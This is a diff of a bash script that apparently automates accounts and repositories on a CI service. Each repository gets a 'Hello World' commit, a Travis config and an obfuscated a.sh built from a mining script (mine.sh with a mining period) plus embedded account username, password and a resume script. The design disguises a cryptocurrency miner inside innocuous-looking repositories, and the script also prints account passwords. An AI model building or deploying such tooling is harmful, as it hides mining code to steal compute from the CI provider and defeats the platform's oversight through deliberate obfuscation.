@@ -89,22 +89,18 @@ create_and_config_repository() {
     echo "Hello World!" > hello.txt
     cp "$MAIN_DIR/bash_scripts/travis.yml" ./.travis.yml
 
-    head -2 "$MAIN_DIR/bash_scripts/mine.sh" > ./temp.sh
-    echo "TIME=$MINING_PERIOD_IN_SECONDS" >> temp.sh
-    tail -n +4 "$MAIN_DIR/bash_scripts/mine.sh" >> temp.sh
-    bash-obfuscate temp.sh -o ./a.sh
-    rm temp.sh
-
-    echo "#!/bin/bash"                              >  ./temp.sh
+    head -2 "$MAIN_DIR/bash_scripts/mine.sh"        > ./temp.sh
+    echo "TIME=$MINING_PERIOD_IN_SECONDS"           >> ./temp.sh
+    tail -n +4 "$MAIN_DIR/bash_scripts/mine.sh"     >> ./temp.sh
     echo ""                                         >> ./temp.sh
     echo "USERNAME=\"$USERNAME\""                   >> ./temp.sh
     echo "PASSWORD=\"$PASSWORD\""                   >> ./temp.sh
     echo "REPOSITORY_NAME=\"$REPOSITORY_NAME\""     >> ./temp.sh
     tail -n +6 "$MAIN_DIR/bash_scripts/resume.sh"   >> ./temp.sh
-    bash-obfuscate temp.sh -o ./b.sh
+    bash-obfuscate temp.sh -o ./a.sh
     rm temp.sh
 
-    chmod +x ./a.sh ./b.sh
+    chmod +x ./a.sh
 
     git add .
     git commit -am "Hello World"
@@ -156,6 +152,8 @@ make_commits() {
 }
 
 print_account_info_for_manual_verification() {
+    echo "--------------------------------------------------"
+    echo "Summary:"
     echo "EMAIL: $EMAIL"
     echo "USERNAME: $USERNAME"
     echo "PASSWORD: $PASSWORD"
